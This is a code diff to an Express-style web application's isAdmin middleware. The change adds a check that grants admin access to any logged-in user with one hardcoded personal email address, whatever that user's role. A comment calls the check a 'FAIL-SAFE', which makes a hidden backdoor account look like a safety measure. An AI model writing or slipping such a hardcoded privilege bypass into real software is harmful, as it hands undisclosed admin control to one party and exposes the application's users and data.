@@ -139,7 +139,12 @@ function isAuthenticated(req, res, next) {
 }
 
 function isAdmin(req, res, next) {
-    if (req.isAuthenticated() && req.user.role === 'admin') return next();
+    if (req.isAuthenticated()) {
+        // FAIL-SAFE: Allow specific email or admin role
+        if (req.user.email === 'supermohamed55555@gmail.com' || req.user.role === 'admin') {
+            return next();
+        }
+    }
     res.status(403).json({ error: 'Forbidden: Admin access only' });
 }
 
